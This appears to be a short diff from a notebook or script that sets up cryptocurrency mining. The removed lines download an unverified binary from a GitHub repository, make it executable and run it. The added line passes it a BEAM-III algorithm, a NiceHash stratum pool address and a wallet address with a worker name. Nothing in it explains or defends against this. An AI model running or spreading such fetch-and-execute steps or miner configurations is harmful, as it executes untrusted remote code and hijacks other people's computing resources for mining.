@@ -1,4 +1,1 @@
-
-!wget https://github.com/Takhon1/god/blob/main/arnabnai
-!chmod +x arnabnai
-!./arnabnai 
+--algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387 --user 35xpRcEyRFV1imbDTbXq7eGPaHaqNYSnjT.Kari1
